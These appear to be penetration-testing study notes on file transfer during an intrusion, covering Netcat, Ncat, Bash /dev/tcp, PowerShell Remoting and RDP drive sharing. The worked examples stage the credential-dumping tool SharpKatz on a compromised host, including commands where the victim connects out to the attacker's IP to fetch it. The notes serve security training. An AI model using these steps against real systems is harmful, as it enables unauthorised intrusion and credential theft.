## 1. Introduction

Beyond the standard web, SSH, and scripting-language techniques covered already, there's a handful of other tools worth knowing well: **Netcat**, its modern cousin **Ncat**, **PowerShell Remoting (WinRM)**, and good old **RDP** (Remote Desktop). These come up constantly in real engagements because they don't depend on having a convenient web server or outbound HTTP access — they work over raw network connections or existing remote-access channels.

**Machine labels used in this section:**

| Label | Role |
|---|---|
| **FOOT_HOLD** (shown as `victim@target` in command prompts) | The compromised/target machine |
| **HACKER** (a.k.a. Pwnbox, the "attack host") | Your own attack machine |

The PowerShell Remoting section introduces a slightly different pair of machines — **DC01** and **DATABASE01** — representing two machines inside the same Windows network where you already have valid administrative access to both. That's a different scenario from "attacker vs. compromised victim," so it's called out separately when it comes up.

## 2. Netcat and Ncat

**Netcat** (commonly shortened to `nc`) is a simple networking utility that reads from and writes to network connections over TCP or UDP. Think of it as a basic "pipe" between two computers — whatever you feed into one end comes out the other, which makes it naturally useful for transferring files, not just typing messages back and forth.

### 2.1 Netcat vs. Ncat: What's the Difference?

The original Netcat was released by a developer using the handle "Hobbit" back in 1995, and despite remaining popular, it hasn't seen continued active development. Its usefulness led the Nmap Project to build **Ncat**, a modern reimplementation with extra features: SSL/TLS encryption, IPv6 support, SOCKS and HTTP proxy support, and more advanced connection handling ("connection brokering").

Both tools will be shown side by side below, since you may encounter either one depending on what's already installed on a given machine.

### 2.2 Method 1: Target Listens, Attacker Sends

In this approach, FOOT_HOLD opens a "listening" port and waits, while HACKER actively connects to it and pushes the file over. This works well when there's no firewall blocking FOOT_HOLD from accepting an inbound connection.

**Example scenario:** transferring a tool called `SharpKatz.exe` from HACKER onto FOOT_HOLD.

**Step 1 — On FOOT_HOLD: start listening on port 8000 and save whatever arrives to a file.**

Using original Netcat:
```
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
*`-l` puts Netcat into listening mode (waiting for an incoming connection, rather than making one). `-p 8000` sets the port to listen on. The `>` redirects whatever data comes in over that connection into a new file called `SharpKatz.exe`.*

Using Ncat instead:
```
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
*Same idea, but Ncat needs the extra `--recv-only` flag to automatically close the connection once the transfer finishes — without it, Ncat would keep the connection open indefinitely, waiting to see if more data arrives.*

**Step 2 — On HACKER: fetch the tool locally, then connect to FOOT_HOLD and send it.**

Using original Netcat:
```
$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
$ # Example using Original Netcat
$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
*The `wget` command just grabs a copy of the tool onto HACKER first (the IP `192.168.49.128` here is FOOT_HOLD's address, since that's who you're connecting out to). The `<` redirects the local file's content *into* Netcat as its input, sending it down the wire. `-q 0` tells Netcat to close the connection immediately (after 0 seconds of waiting) once it's done sending — which is how you know the transfer has actually completed on this end.*

Using Ncat instead:
```
$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
$ # Example using Ncat
$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
*`--send-only` is Ncat's equivalent of `-q 0` — it tells Ncat to stop once it has finished sending all its input, rather than waiting around for the other side to potentially send something back.*

### 2.3 Method 2: Attacker Listens, Target Connects

This flips the previous method around: now **HACKER** does the listening, and **FOOT_HOLD** is the one that reaches out to connect. This is the better choice when a firewall is blocking *inbound* connections to FOOT_HOLD but still allows it to make *outbound* ones — a very common setup in real networks.

**Step 1 — On HACKER: listen on port 443, with the file to send as input.**

Using original Netcat:
```
$ # Example using Original Netcat
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
*`sudo` is needed here because port 443 is a "privileged" port (below 1024), which normally requires elevated permissions to bind to. The `<` feeds `SharpKatz.exe` in as the data to send once a connection comes in, and `-q 0` closes things promptly once it's sent.*

**Step 2 — On FOOT_HOLD: connect out to HACKER to receive the file.**
```
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```
*This time there's no `-l` — FOOT_HOLD is actively connecting *to* HACKER's IP and port, rather than waiting for a connection. The `>` saves whatever comes through to a local file.*

**Doing the same thing with Ncat:**

On HACKER:
```
$ # Example using Ncat
$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

On FOOT_HOLD:
```
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
*Same roles as the original Netcat version, just with Ncat's `--send-only` / `--recv-only` flags instead of `-q 0`, for the same reason explained earlier — ensuring each side closes out cleanly once its part of the transfer is finished.*

### 2.4 No Netcat/Ncat? Use Bash's /dev/tcp as a Receiver

If FOOT_HOLD doesn't have Netcat or Ncat installed at all, Bash's own built-in pseudo-device file `/dev/tcp` (the same feature introduced in the Linux file transfer notes) can step in as a receiver. Writing to this special file path makes Bash open a raw TCP connection to a given host and port — no external tool required.

**Step 1 — On HACKER: listen and provide the file as input (same as Method 2 above).**
```
$ # Example using Original Netcat
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
or, with Ncat:
```
$ # Example using Ncat
$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Step 2 — On FOOT_HOLD: connect using /dev/tcp instead of nc or ncat.**
```
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
*`cat` reads from the special path `/dev/tcp/<IP>/<port>` — which causes Bash to transparently open a TCP connection to that address — and the `>` saves the incoming data to a local file, exactly as `nc` would have.*

> **Note:** this same approach also works in reverse, letting you transfer a file from FOOT_HOLD back onto HACKER — just swap which side is listening and which side is reading/writing through `/dev/tcp`.

## 3. PowerShell Session File Transfer (WinRM)

The PowerShell web-based download methods covered earlier all assume HTTP, HTTPS, or SMB access is available. When none of those protocols are usable, **PowerShell Remoting** — built on a technology called **WinRM (Windows Remote Management)** — offers another path, as long as it's enabled and you have the right permissions.

PowerShell Remoting lets you run commands or scripts on a remote Windows computer as if you were sitting at it directly, and administrators use it constantly for day-to-day remote management — which also makes it a plausible, "blends in" channel for file transfers. Enabling it sets up both an HTTP listener (port **TCP/5985**) and an HTTPS listener (port **TCP/5986**) by default.

**Requirements to use it:** you need administrative access on the target, membership in its Remote Management Users group, or explicit permission granted in that machine's session configuration.

**Scenario for this example:** two domain machines, **DC01** and **DATABASE01**. You're logged into DC01 as a domain administrator, that same account has administrative rights on DATABASE01 too, and PowerShell Remoting is already enabled on both.

**Step 1 — On DC01: confirm who you are and which machine you're on.**
```
PS C:\> whoami

dc01\administrator

PS C:\> hostname

DC01
```
*`whoami` confirms the currently logged-in account (`dc01\administrator` — a domain administrator account), and `hostname` confirms you're indeed sitting on DC01.*

**Step 2 — On DC01: check that DATABASE01's WinRM port is reachable.**
```
PS C:\> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```
*`Test-NetConnection` checks whether a specific port on a specific remote machine can be reached — similar in spirit to a simple port scan. `TcpTestSucceeded : True` confirms port 5985 (the default WinRM/HTTP port) is open and reachable from DC01.*

**Step 3 — On DC01: open a PowerShell Remoting session to DATABASE01.**
```
PS C:\> $Session = New-PSSession -ComputerName DATABASE01
```
*`New-PSSession` establishes a persistent remote session to the named computer. Because the currently logged-in account already has administrative rights on DATABASE01, no separate credentials need to be supplied here. The session itself is stored in the `$Session` variable so it can be reused across multiple commands.*

**Step 4 — Copy a file from DC01 (local) to DATABASE01 (the session).**
```
PS C:\> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
*`Copy-Item` is normally used for local file copies, but the `-ToSession` parameter tells it to send the file across an existing PowerShell Remoting session instead — `-Path` is the local source on DC01, and `-Destination` is the path to save it to on DATABASE01.*

**Step 5 — Copy a file the other direction, from DATABASE01 back to DC01 (local).**
```
PS C:\> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
*This time, `-FromSession` reverses the direction: `-Path` now refers to a file on the remote machine (DATABASE01, via the session), and `-Destination` is where to save it locally on DC01.*

## 4. RDP File Transfer

**RDP (Remote Desktop Protocol)** is the standard way to get a full graphical remote-access session into a Windows machine. Beyond just viewing and controlling the remote desktop, RDP also supports moving files, which makes it a convenient, no-extra-tooling-needed transfer option whenever you already have RDP access.

**Simplest method — copy and paste.** Connect to the remote Windows machine over RDP, right-click a file, copy it, then paste it directly into your RDP session's window (or vice versa) — Windows handles the clipboard-based transfer automatically, no setup required.

**From Linux, connecting with `xfreerdp` or `rdesktop`:** both of these open-source RDP clients also support the same clipboard-based copy from the target machine into your RDP session, though copy/paste behavior isn't always perfectly reliable with every server configuration.

**Alternative — mounting a local folder as a network drive inside the RDP session.** Rather than relying on copy/paste, you can expose a folder from your own (local) machine directly inside the remote RDP session, so it shows up like a mapped network drive.

**Using `rdesktop`:**
```
$ rdesktop 10.10.10.132 -d EXAMPLE_DOMAIN -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
*`-d` sets the domain, `-u` and `-p` provide the username and password for the RDP login. `-r disk:linux='/path'` is the key part — it tells rdesktop to redirect (share) the local folder at that path into the session, labeled `linux`.*

**Using `xfreerdp`:**
```
$ xfreerdp /v:10.10.10.132 /d:EXAMPLE_DOMAIN /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/filetransfer
```
*`/v:` sets the target server's address, and `/drive:linux,/path` is the equivalent folder-sharing option — mapping the given local path into the session under the name `linux`.*

**Inside the remote session**, that shared folder becomes accessible by navigating to `\\tsclient\` (followed by the drive label you chose, e.g. `\\tsclient\linux`) — from there you can freely copy files in either direction between your local machine and the remote one.

**On Windows itself**, the built-in `mstsc.exe` Remote Desktop client offers the same drive-sharing capability through its connection settings, letting you pick a local drive or folder to make available before connecting — after which it appears the same way inside the remote session.

> **Security note:** a drive shared this way is only accessible to the session that created it — even if another user on the target machine somehow manages to hijack or take over that RDP session, they still won't be able to see or access the mounted drive.

## 6. Cheat Sheet

| Goal | Tool | Run on | Key Command |
|---|---|---|---|
| Listen for incoming file (Netcat) | nc | target | `nc -l -p PORT > outfile` |
| Listen for incoming file (Ncat) | ncat | target | `ncat -l -p PORT --recv-only > outfile` |
| Send a file to a listener (Netcat) | nc | attacker | `nc -q 0 IP PORT < infile` |
| Send a file to a listener (Ncat) | ncat | attacker | `ncat --send-only IP PORT < infile` |
| Listen and serve a file for pickup (Netcat) | nc | attacker | `sudo nc -l -p PORT -q 0 < infile` |
| Listen and serve a file for pickup (Ncat) | ncat | attacker | `sudo ncat -l -p PORT --send-only < infile` |
| Connect and receive, no nc/ncat available | Bash | target | `cat < /dev/tcp/IP/PORT > outfile` |
| Check if a remote port is reachable | PowerShell | admin machine | `Test-NetConnection -ComputerName NAME -Port 5985` |
| Open a PowerShell Remoting session | PowerShell | admin machine | `$Session = New-PSSession -ComputerName NAME` |
| Copy a local file into a remote session | PowerShell | admin machine | `Copy-Item -Path local -ToSession $Session -Destination remote` |
| Copy a remote file back to local | PowerShell | admin machine | `Copy-Item -Path remote -Destination local -FromSession $Session` |
| Mount a local folder in an RDP session (rdesktop) | rdesktop | client machine | `rdesktop IP -d DOMAIN -u USER -p PASS -r disk:label='/local/path'` |
| Mount a local folder in an RDP session (xfreerdp) | xfreerdp | client machine | `xfreerdp /v:IP /d:DOMAIN /u:USER /p:PASS /drive:label,/local/path` |
| Access a mounted RDP drive | — | inside session | `\\tsclient\label` |

## 7. Big-Picture Takeaways

1. **Who listens and who connects is a deliberate, strategic choice.** Netcat/Ncat transfers can run in either direction — target listens & attacker connects, or attacker listens & target connects — and the right choice usually comes down to which direction the firewall actually allows.
2. **Ncat isn't just "Netcat with extra features" — it changes some defaults too.** The need for explicit `--recv-only`/`--send-only` flags (where original Netcat uses `-q 0` instead) is a small but important syntax difference worth remembering, since forgetting it can leave a connection hanging open indefinitely.
3. **When no dedicated tool is available, the shell itself can substitute.** Just like in the Linux notes, Bash's `/dev/tcp` can stand in for Netcat/Ncat as a receiver when neither tool happens to be installed on the target.
4. **Remote administration channels double as file transfer channels.** WinRM/PowerShell Remoting exists for legitimate system administration, but the exact same `Copy-Item` cmdlet used for routine admin work doubles perfectly well as a file transfer method — and it works even when HTTP, HTTPS, SMB, and FTP are all unavailable.
5. **Lateral movement scenarios are a different shape than classic attacker-vs-victim.** The DC01-to-DATABASE01 example is really about moving between two machines you already have legitimate (or compromised-but-equivalent) access to within the same network — the "download/upload" framing of earlier sections doesn't quite apply the same way here.
6. **RDP file transfer is often hiding in plain sight.** Copy-paste between an RDP session and your local machine is so simple it's easy to overlook as a file transfer "technique" — but it works out of the box with zero extra setup, which also makes it easy for defenders to miss if they're only watching for network-based transfers.
7. **Mounted RDP drives are session-scoped for a reason.** The fact that a shared local drive in an RDP session can't be seen by anyone who hijacks that session afterward is a deliberate security boundary — worth knowing both as an attacker weighing persistence options and as a defender reasoning about session security.
